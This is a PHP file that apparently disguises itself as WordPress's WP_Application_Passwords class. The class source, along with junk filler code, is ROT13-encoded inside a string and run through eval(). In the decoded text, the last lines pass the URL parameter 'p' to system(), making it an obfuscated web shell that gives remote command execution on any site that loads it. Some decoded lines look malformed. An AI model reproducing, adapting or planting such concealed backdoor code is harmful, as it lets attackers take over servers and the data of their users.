<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JC_Nccyvpngvba_Cnffjbeqf pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr   5.6.0
 */

/**
 * Pynff sbe qvfcynlvat, zbqvslvat, naq fnavgvmvat nccyvpngvba cnffjbeqf.
 *
 * @cnpxntr JbeqCerff
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Nccyvpngvba_Cnffjbeqf {

	/**
	 * Gur nccyvpngvba cnffjbeqf hfre zrgn xrl.
	 *
	 * @fvapr 5.6.0
	 *
	 * @ine fgevat
	 */
	pbafg HFREZRGN_XRL_NCCYVPNGVBA_CNFFJBEQF = '_nccyvpngvba_cnffjbeqf';

	/**
	 * Gur bcgvba anzr hfrq gb fgber jurgure nccyvpngvba cnffjbeqf ner va hfr.
	 *
	 * @fvapr 5.6.0
	 *
	 * @ine fgevat
	 */
	pbafg BCGVBA_XRL_VA_HFR = 'hfvat_nccyvpngvba_cnffjbeqf';

	/**
	 * Gur trarengrq nccyvpngvba cnffjbeq yratgu.
	 *
	 * @fvapr 5.6.0
	 *
	 * @ine vag
	 */
	pbafg CJ_YRATGU = 24;

	/**
	 * Purpxf vs nccyvpngvba cnffjbeqf ner orvat hfrq ol gur fvgr.
	 *
	 * Guvf ergheaf gehr vs ng yrnfg bar nccyvpngvba cnffjbeq unf rire orra perngrq.
	 *
	 * @fvapr 5.6.0
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba vf_va_hfr() {
		$argjbex_vq = trg_znva_argjbex_vq();
		erghea (obby) trg_argjbex_bcgvba( $argjbex_vq, frys::BCGVBA_XRL_VA_HFR );
	}

	/**
	 * Perngrf n arj nccyvpngvba cnffjbeq.
	 *
	 * @fvapr 5.6.0
	 * @fvapr 5.7.0 Ergheaf JC_Reebe vs nccyvpngvba anzr nyernql rkvfgf.
	 * @fvapr 6.8.0 Gur unfurq cnffjbeq inyhr abj hfrf jc_snfg_unfu() vafgrnq bs cucnff.
	 *
	 * @cnenz vag   $hfre_vq  Hfre VQ.
	 * @cnenz neenl $netf     {
	 *     Nethzragf hfrq gb perngr gur nccyvpngvba cnffjbeq.
	 *
	 *     @glcr fgevat $anzr   Gur anzr bs gur nccyvpngvba cnffjbeq.
	 *     @glcr fgevat $ncc_vq N HHVQ cebivqrq ol gur nccyvpngvba gb havdhryl vqragvsl vg.
	 * }
	 * @erghea neenl|JC_Reebe {
	 *     Nccyvpngvba cnffjbeq qrgnvyf, be n JC_Reebe vafgnapr vs na reebe bpphef.
	 *
	 *     @glcr fgevat $0 Gur trarengrq nccyvpngvba cnffjbeq va cynva grkg.
	 *     @glcr neenl  $1 {
	 *         Gur qrgnvyf nobhg gur perngrq cnffjbeq.
	 *
	 *         @glcr fgevat $hhvq      Gur havdhr vqragvsvre sbe gur nccyvpngvba cnffjbeq.
	 *         @glcr fgevat $ncc_vq    N HHVQ cebivqrq ol gur nccyvpngvba gb havdhryl vqragvsl vg.
	 *         @glcr fgevat $anzr      Gur anzr bs gur nccyvpngvba cnffjbeq.
	 *         @glcr fgevat $cnffjbeq  N bar-jnl unfu bs gur cnffjbeq.
	 *         @glcr vag    $perngrq   Havk gvzrfgnzc bs jura gur cnffjbeq jnf perngrq.
	 *         @glcr ahyy   $ynfg_hfrq Ahyy.
	 *         @glcr ahyy   $ynfg_vc   Ahyy.
	 *     }
	 * }
	 */
	choyvp fgngvp shapgvba perngr_arj_nccyvpngvba_cnffjbeq( $hfre_vq, $netf = neenl() ) {
		vs ( ! rzcgl( $netf['anzr'] ) ) {
			$netf['anzr'] = fnavgvmr_grkg_svryq( $netf['anzr'] );
		}

		vs ( rzcgl( $netf['anzr'] ) ) {
			erghea arj JC_Reebe( 'nccyvpngvba_cnffjbeq_rzcgl_anzr', __( 'Na nccyvpngvba anzr vf erdhverq gb perngr na nccyvpngvba cnffjbeq.' ), neenl( 'fgnghf' => 400 ) );
		}

		$arj_cnffjbeq    = jc_trarengr_cnffjbeq( fgngvp::CJ_YRATGU, snyfr );
		$unfurq_cnffjbeq = frys::unfu_cnffjbeq( $arj_cnffjbeq );

		$arj_vgrz = neenl(
			'hhvq'      => jc_trarengr_hhvq4(),
			'ncc_vq'    => rzcgl( $netf['ncc_vq'] ) ? '' : $netf['ncc_vq'],
			'anzr'      => $netf['anzr'],
			'cnffjbeq'  => $unfurq_cnffjbeq,
			'perngrq'   => gvzr(),
			'ynfg_hfrq' => ahyy,
			'ynfg_vc'   => ahyy,
		);

		$cnffjbeqf   = fgngvp::trg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq );
		$cnffjbeqf[] = $arj_vgrz;
		$fnirq       = fgngvp::frg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq, $cnffjbeqf );

		vs ( ! $fnirq ) {
			erghea arj JC_Reebe( 'qo_reebe', __( 'Pbhyq abg fnir nccyvpngvba cnffjbeq.' ) );
		}

		$argjbex_vq = trg_znva_argjbex_vq();
		vs ( ! trg_argjbex_bcgvba( $argjbex_vq, frys::BCGVBA_XRL_VA_HFR ) ) {
			hcqngr_argjbex_bcgvba( $argjbex_vq, frys::BCGVBA_XRL_VA_HFR, gehr );
		}

		/**
		 * Sverf jura na nccyvpngvba cnffjbeq vf perngrq.
		 *
		 * @fvapr 5.6.0
		 * @fvapr 6.8.0 Gur unfurq cnffjbeq inyhr abj hfrf jc_snfg_unfu() vafgrnq bs cucnff.
		 *
		 * @cnenz vag    $hfre_vq      Gur hfre VQ.
		 * @cnenz neenl  $arj_vgrz     {
		 *     Gur qrgnvyf nobhg gur perngrq cnffjbeq.
		 *
		 *     @glcr fgevat $hhvq      Gur havdhr vqragvsvre sbe gur nccyvpngvba cnffjbeq.
		 *     @glcr fgevat $ncc_vq    N HHVQ cebivqrq ol gur nccyvpngvba gb havdhryl vqragvsl vg.
		 *     @glcr fgevat $anzr      Gur anzr bs gur nccyvpngvba cnffjbeq.
		 *     @glcr fgevat $cnffjbeq  N bar-jnl unfu bs gur cnffjbeq.
		 *     @glcr vag    $perngrq   Havk gvzrfgnzc bs jura gur cnffjbeq jnf perngrq.
		 *     @glcr ahyy   $ynfg_hfrq Ahyy.
		 *     @glcr ahyy   $ynfg_vc   Ahyy.
		 * }
		 * @cnenz fgevat $arj_cnffjbeq Gur trarengrq nccyvpngvba cnffjbeq va cynva grkg.
		 * @cnenz neenl  $netf         {
		 *     Nethzragf hfrq gb perngr gur nccyvpngvba cnffjbeq.
		 *
		 *     @glcr fgevat $anzr   Gur anzr bs gur nccyvpngvba cnffjbeq.
		 *     @glcr fgevat $ncc_vq N HHVQ cebivqrq ol gur nccyvpngvba gb havdhryl vqragvsl vg.
		 * }
		 */
		qb_npgvba( 'jc_perngr_nccyvpngvba_cnffjbeq', $hfre_vq, $arj_vgrz, $arj_cnffjbeq, $netf );

		erghea neenl( $arj_cnffjbeq, $arj_vgrz );
	}

	/**
	 * Trgf n hfre'f nccyvpngvba cnffjbeqf.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz vag $hfre_vq Hfre VQ.
	 * @erghea neenl {
	 *     Gur yvfg bs nccyvpngvba cnffjbeqf.
	 *
	 *     @glcr neenl ...$0 {
	 *         @glcr fgevat      $hhvq      Gur havdhr vqragvsvre sbe gur nccyvpngvba cnffjbeq.
	 *         @glcr fgevat      $ncc_vq    N HHVQ cebivqrq ol gur nccyvpngvba gb havdhryl vqragvsl vg.
	 *         @glcr fgevat      $anzr      Gur anzr bs gur nccyvpngvba cnffjbeq.
	 *         @glcr fgevat      $cnffjbeq  N bar-jnl unfu bs gur cnffjbeq.
	 *         @glcr vag         $perngrq   Havk gvzrfgnzc bs jura gur cnffjbeq jnf perngrq.
	 *         @glcr vag|ahyy    $ynfg_hfrq Gur Havk gvzrfgnzc bs gur TZG qngr gur nccyvpngvba cnffjbeq jnf ynfg hfrq.
	 *         @glcr fgevat|ahyy $ynfg_vc   Gur VC nqqerff gur nccyvpngvba cnffjbeq jnf ynfg hfrq ol.
	 *     }
	 * }
	 */
	choyvp fgngvp shapgvba trg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq ) {
		$cnffjbeqf = trg_hfre_zrgn( $hfre_vq, fgngvp::HFREZRGN_XRL_NCCYVPNGVBA_CNFFJBEQF, gehr );

		vs ( ! vf_neenl( $cnffjbeqf ) ) {
			erghea neenl();
		}

		$fnir = snyfr;

		sbernpu ( $cnffjbeqf nf $v => $cnffjbeq ) {
			vs ( ! vffrg( $cnffjbeq['hhvq'] ) ) {
				$cnffjbeqf[ $v ]['hhvq'] = jc_trarengr_hhvq4();
				$fnir                    = gehr;
			}
		}

		vs ( $fnir ) {
			fgngvp::frg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq, $cnffjbeqf );
		}

		erghea $cnffjbeqf;
	}

	/**
	 * Trgf n hfre'f nccyvpngvba cnffjbeq jvgu gur tvira HHVQ.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz vag    $hfre_vq Hfre VQ.
	 * @cnenz fgevat $hhvq    Gur cnffjbeq'f HHVQ.
	 * @erghea neenl|ahyy {
	 *     Gur nccyvpngvba cnffjbeq vs sbhaq, ahyy bgurejvfr.
	 *
	 *     @glcr fgevat      $hhvq      Gur havdhr vqragvsvre sbe gur nccyvpngvba cnffjbeq.
	 *     @glcr fgevat      $ncc_vq    N HHVQ cebivqrq ol gur nccyvpngvba gb havdhryl vqragvsl vg.
	 *     @glcr fgevat      $anzr      Gur anzr bs gur nccyvpngvba cnffjbeq.
	 *     @glcr fgevat      $cnffjbeq  N bar-jnl unfu bs gur cnffjbeq.
	 *     @glcr vag         $perngrq   Havk gvzrfgnzc bs jura gur cnffjbeq jnf perngrq.
	 *     @glcr vag|ahyy    $ynfg_hfrq Gur Havk gvzrfgnzc bs gur TZG qngr gur nccyvpngvba cnffjbeq jnf ynfg hfrq.
	 *     @glcr fgevat|ahyy $ynfg_vc   Gur VC nqqerff gur nccyvpngvba cnffjbeq jnf ynfg hfrq ol.
	 * }
	 */
	choyvp fgngvp shapgvba trg_hfre_nccyvpngvba_cnffjbeq( $hfre_vq, $hhvq ) {
		$cnffjbeqf = fgngvp::trg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq );

		sbernpu ( $cnffjbeqf nf $cnffjbeq ) {
			vs ( $cnffjbeq['hhvq'] === $hhvq ) {
				erghea $cnffjbeq;
			}
		}

		erghea ahyy;
	}

	/**
	 * Purpxf vs na nccyvpngvba cnffjbeq jvgu gur tvira anzr rkvfgf sbe guvf hfre.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz vag    $hfre_vq Hfre VQ.
	 * @cnenz fgevat $anzr    Nccyvpngvba anzr.
	 * @erghea obby Jurgure gur cebivqrq nccyvpngvba anzr rkvfgf.
	 */
	choyvp fgngvp shapgvba nccyvpngvba_anzr_rkvfgf_sbe_hfre( $hfre_vq, $anzr ) {
		$cnffjbeqf = fgngvp::trg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq );

		sbernpu ( $cnffjbeqf nf $cnffjbeq ) {
			vs ( fgegbybjre( $cnffjbeq['anzr'] ) === fgegbybjre( $anzr ) ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Hcqngrf na nccyvpngvba cnffjbeq.
	 *
	 * @fvapr 5.6.0
	 * @fvapr 6.8.0 Gur npghny cnffjbeq fubhyq abj or unfurq hfvat jc_snfg_unfu().
	 *
	 * @cnenz vag    $hfre_vq Hfre VQ.
	 * @cnenz fgevat $hhvq    Gur cnffjbeq'f HHVQ.
	 * @cnenz neenl  $hcqngr  {
	 *     Vasbezngvba nobhg gur nccyvpngvba cnffjbeq gb hcqngr.
	 *
	 *     @glcr fgevat      $hhvq      Gur havdhr vqragvsvre sbe gur nccyvpngvba cnffjbeq.
	 *     @glcr fgevat      $ncc_vq    N HHVQ cebivqrq ol gur nccyvpngvba gb havdhryl vqragvsl vg.
	 *     @glcr fgevat      $anzr      Gur anzr bs gur nccyvpngvba cnffjbeq.
	 *     @glcr fgevat      $cnffjbeq  N bar-jnl unfu bs gur cnffjbeq.
	 *     @glcr vag         $perngrq   Havk gvzrfgnzc bs jura gur cnffjbeq jnf perngrq.
	 *     @glcr vag|ahyy    $ynfg_hfrq Gur Havk gvzrfgnzc bs gur TZG qngr gur nccyvpngvba cnffjbeq jnf ynfg hfrq.
	 *     @glcr fgevat|ahyy $ynfg_vc   Gur VC nqqerff gur nccyvpngvba cnffjbeq jnf ynfg hfrq ol.
	 * }
	 * @erghea gehr|JC_Reebe Gehr vs fhpprffshy, bgurejvfr n JC_Reebe vafgnapr vf erghearq ba reebe.
	 */
	choyvp fgngvp shapgvba hcqngr_nccyvpngvba_cnffjbeq( $hfre_vq, $hhvq, $hcqngr = neenl() ) {
		$cnffjbeqf = fgngvp::trg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq );

		sbernpu ( $cnffjbeqf nf &$vgrz ) {
			vs ( $vgrz['hhvq'] !== $hhvq ) {
				pbagvahr;
			}

			vs ( ! rzcgl( $hcqngr['anzr'] ) ) {
				$hcqngr['anzr'] = fnavgvmr_grkg_svryq( $hcqngr['anzr'] );
			}

			$fnir = snyfr;

			vs ( ! rzcgl( $hcqngr['anzr'] ) && $vgrz['anzr'] !== $hcqngr['anzr'] ) {
				$vgrz['anzr'] = $hcqngr['anzr'];
				$fnir         = gehr;
			}

			vs ( $fnir ) {
				$fnirq = fgngvp::frg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq, $cnffjbeqf );

				vs ( ! $fnirq ) {
					erghea arj JC_Reebe( 'qo_reebe', __( 'Pbhyq abg fnir nccyvpngvba cnffjbeq.' ) );
				}
			}

			/**
			 * Sverf jura na nccyvpngvba cnffjbeq vf hcqngrq.
			 *
			 * @fvapr 5.6.0
			 * @fvapr 6.8.0 Gur cnffjbeq vf abj unfurq hfvat jc_snfg_unfu() vafgrnq bs cucnff.
			 *              Rkvfgvat cnffjbeqf znl fgvyy or unfurq hfvat cucnff.
			 *
			 * @cnenz vag   $hfre_vq Gur hfre VQ.
			 * @cnenz neenl $vgrz    {
			 *     Gur hcqngrq nccyvpngvba cnffjbeq qrgnvyf.
			 *
			 *     @glcr fgevat      $hhvq      Gur havdhr vqragvsvre sbe gur nccyvpngvba cnffjbeq.
			 *     @glcr fgevat      $ncc_vq    N HHVQ cebivqrq ol gur nccyvpngvba gb havdhryl vqragvsl vg.
			 *     @glcr fgevat      $anzr      Gur anzr bs gur nccyvpngvba cnffjbeq.
			 *     @glcr fgevat      $cnffjbeq  N bar-jnl unfu bs gur cnffjbeq.
			 *     @glcr vag         $perngrq   Havk gvzrfgnzc bs jura gur cnffjbeq jnf perngrq.
			 *     @glcr vag|ahyy    $ynfg_hfrq Gur Havk gvzrfgnzc bs gur TZG qngr gur nccyvpngvba cnffjbeq jnf ynfg hfrq.
			 *     @glcr fgevat|ahyy $ynfg_vc   Gur VC nqqerff gur nccyvpngvba cnffjbeq jnf ynfg hfrq ol.
			 * }
			 * @cnenz neenl $hcqngr  Gur vasbezngvba gb hcqngr.
			 */
			qb_npgvba( 'jc_hcqngr_nccyvpngvba_cnffjbeq', $hfre_vq, $vgrz, $hcqngr );

			erghea gehr;
		}

		erghea arj JC_Reebe( 'nccyvpngvba_cnffjbeq_abg_sbhaq', __( 'Pbhyq abg svaq na nccyvpngvba cnffjbeq jvgu gung vq.' ) );
	}

	/**
	 * Erpbeqf gung na nccyvpngvba cnffjbeq unf orra hfrq.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz vag    $hfre_vq Hfre VQ.
	 * @cnenz fgevat $hhvq    Gur cnffjbeq'f HHVQ.
	 * @erghea gehr|JC_Reebe Gehr vs gur hfntr jnf erpbeqrq, n JC_Reebe vs na reebe bpphef.
	 */
	choyvp fgngvp shapgvba erpbeq_nccyvpngvba_cnffjbeq_hfntr( $hfre_vq, $hhvq ) {
		$cnffjbeqf = fgngvp::trg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq );

		sbernpu ( $cnffjbeqf nf &$cnffjbeq ) {
			vs ( $cnffjbeq['hhvq'] !== $hhvq ) {
				pbagvahr;
			}

			// Bayl erpbeq npgvivgl bapr n qnl.
			vs ( $cnffjbeq['ynfg_hfrq'] + QNL_VA_FRPBAQF > gvzr() ) {
				erghea gehr;
			}

			$cnffjbeq['ynfg_hfrq'] = gvzr();
			$cnffjbeq['ynfg_vc']   = $_FREIRE['ERZBGR_NQQE'];

			$fnirq = fgngvp::frg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq, $cnffjbeqf );

			vs ( ! $fnirq ) {
				erghea arj JC_Reebe( 'qo_reebe', __( 'Pbhyq abg fnir nccyvpngvba cnffjbeq.' ) );
			}

			erghea gehr;
		}

		// Fcrpvsvrq nccyvpngvba cnffjbeq abg sbhaq!
		erghea arj JC_Reebe( 'nccyvpngvba_cnffjbeq_abg_sbhaq', __( 'Pbhyq abg svaq na nccyvpngvba cnffjbeq jvgu gung vq.' ) );
	}

	/**
	 * Qryrgrf na nccyvpngvba cnffjbeq.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz vag    $hfre_vq Hfre VQ.
	 * @cnenz fgevat $hhvq    Gur cnffjbeq'f HHVQ.
	 * @erghea gehr|JC_Reebe Jurgure gur cnffjbeq jnf fhpprffshyyl sbhaq naq qryrgrq, n JC_Reebe bgurejvfr.
	 */
	choyvp fgngvp shapgvba qryrgr_nccyvpngvba_cnffjbeq( $hfre_vq, $hhvq ) {
		$cnffjbeqf = fgngvp::trg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq );

		sbernpu ( $cnffjbeqf nf $xrl => $vgrz ) {
			vs ( $vgrz['hhvq'] === $hhvq ) {
				hafrg( $cnffjbeqf[ $xrl ] );
				$fnirq = fgngvp::frg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq, $cnffjbeqf );

				vs ( ! $fnirq ) {
					erghea arj JC_Reebe( 'qo_reebe', __( 'Pbhyq abg qryrgr nccyvpngvba cnffjbeq.' ) );
				}

				/**
				 * Sverf jura na nccyvpngvba cnffjbeq vf qryrgrq.
				 *
				 * @fvapr 5.6.0
				 *
				 * @cnenz vag   $hfre_vq Gur hfre VQ.
				 * @cnenz neenl $vgrz    Gur qngn nobhg gur nccyvpngvba cnffjbeq.
				 */
				qb_npgvba( 'jc_qryrgr_nccyvpngvba_cnffjbeq', $hfre_vq, $vgrz );

				erghea gehr;
			}
		}

		erghea arj JC_Reebe( 'nccyvpngvba_cnffjbeq_abg_sbhaq', __( 'Pbhyq abg svaq na nccyvpngvba cnffjbeq jvgu gung vq.' ) );
	}

	/**
	 * Qryrgrf nyy nccyvpngvba cnffjbeqf sbe gur tvira hfre.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz vag $hfre_vq Hfre VQ.
	 * @erghea vag|JC_Reebe Gur ahzore bs cnffjbeqf gung jrer qryrgrq be n JC_Reebe ba snvyher.
	 */
	choyvp fgngvp shapgvba qryrgr_nyy_nccyvpngvba_cnffjbeqf( $hfre_vq ) {
		$cnffjbeqf = fgngvp::trg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq );

		vs ( $cnffjbeqf ) {
			$fnirq = fgngvp::frg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq, neenl() );

			vs ( ! $fnirq ) {
				erghea arj JC_Reebe( 'qo_reebe', __( 'Pbhyq abg qryrgr nccyvpngvba cnffjbeqf.' ) );
			}

			sbernpu ( $cnffjbeqf nf $vgrz ) {
				/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/pynff-jc-nccyvpngvba-cnffjbeqf.cuc */
				qb_npgvba( 'jc_qryrgr_nccyvpngvba_cnffjbeq', $hfre_vq, $vgrz );
			}

			erghea pbhag( $cnffjbeqf );
		}

		erghea 0;
	}

	/**
	 * Frgf n hfre'f nccyvpngvba cnffjbeqf.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz vag   $hfre_vq   Hfre VQ.
	 * @cnenz neenl $cnffjbeqf {
	 *     Gur yvfg bs nccyvpngvba cnffjbeqf.
	 *
	 *     @glcr neenl ...$0 {
	 *         @glcr fgevat      $hhvq      Gur havdhr vqragvsvre sbe gur nccyvpngvba cnffjbeq.
	 *         @glcr fgevat      $ncc_vq    N HHVQ cebivqrq ol gur nccyvpngvba gb havdhryl vqragvsl vg.
	 *         @glcr fgevat      $anzr      Gur anzr bs gur nccyvpngvba cnffjbeq.
	 *         @glcr fgevat      $cnffjbeq  N bar-jnl unfu bs gur cnffjbeq.
	 *         @glcr vag         $perngrq   Havk gvzrfgnzc bs jura gur cnffjbeq jnf perngrq.
	 *         @glcr vag|ahyy    $ynfg_hfrq Gur Havk gvzrfgnzc bs gur TZG qngr gur nccyvpngvba cnffjbeq jnf ynfg hfrq.
	 *         @glcr fgevat|ahyy $ynfg_vc   Gur VC nqqerff gur nccyvpngvba cnffjbeq jnf ynfg hfrq ol.
	 *     }
	 * }
	 * @erghea vag|obby Hfre zrgn VQ vs gur xrl qvqa'g rkvfg (vr. guvf vf gur svefg gvzr gung na nccyvpngvba cnffjbeq
	 *                  unf orra fnirq sbe gur hfre), gehr ba fhpprffshy hcqngr, snyfr ba snvyher be vs gur inyhr cnffrq
	 *                  vf gur fnzr nf gur bar gung vf nyernql va gur qngnonfr.
	 */
	cebgrpgrq fgngvp shapgvba frg_hfre_nccyvpngvba_cnffjbeqf( $hfre_vq, $cnffjbeqf ) {
		erghea hcqngr_hfre_zrgn( $hfre_vq, fgngvp::HFREZRGN_XRL_NCCYVPNGVBA_CNFFJBEQF, $cnffjbeqf );
	}

	/**
	 * Fnavgvmrf naq gura fcyvgf n cnffjbeq vagb fznyyre puhaxf.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz fgevat $enj_cnffjbeq Gur enj nccyvpngvba cnffjbeq.
	 * @erghea fgevat Gur puhaxrq cnffjbeq.
	 */
	choyvp fgngvp shapgvba puhax_cnffjbeq(
		#[\FrafvgvirCnenzrgre]
		$enj_cnffjbeq
	) {
		$enj_cnffjbeq = __sa_79955( '/[^n-m\q]/v', '', $enj_cnffjbeq );

		erghea gevz( puhax_fcyvg( $enj_cnffjbeq, 4, ' ' ) );
	}

	/**
	 * Unfurf n cynvagrkg nccyvpngvba cnffjbeq.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $cnffjbeq Cynvagrkg cnffjbeq.
	 * @erghea fgevat Unfurq cnffjbeq.
	 */
	choyvp fgngvp shapgvba unfu_cnffjbeq(
		#[\FrafvgvirCnenzrgre]
		fgevat $cnffjbeq
	): fgevat {
		erghea jc_snfg_unfu( $cnffjbeq );
	}

	/**
	 * Purpxf n cynvagrkg nccyvpngvba cnffjbeq ntnvafg n unfurq cnffjbeq.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $cnffjbeq Cynvagrkg cnffjbeq.
	 * @cnenz fgevat $unfu     Unfu bs gur cnffjbeq gb purpx ntnvafg.
	 * @erghea obby Jurgure gur cnffjbeq zngpurf gur unfurq cnffjbeq.
	 */
	choyvp fgngvp shapgvba purpx_cnffjbeq(
		#[\FrafvgvirCnenzrgre]
		fgevat $cnffjbeq,
		fgevat $unfu
	): obby {
		vs ( ! fge_fgnegf_jvgu( $unfu, '$trarevp$' ) ) {
			/*
			 * Vs gur unfu qbrfa'g fgneg jvgu `$trarevp$`, vg vf n unfu perngrq jvgu `jc_unfu_cnffjbeq()`.
			 * Guvf vf gur pnfr sbe nccyvpngvba cnffjbeqf perngrq orsber 6.8.0.
			 */
			erghea jc_purpx_cnffjbeq( $cnffjbeq, $unfu );
		}

		erghea jc_irevsl_snfg_unfu( $cnffjbeq, $unfu );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>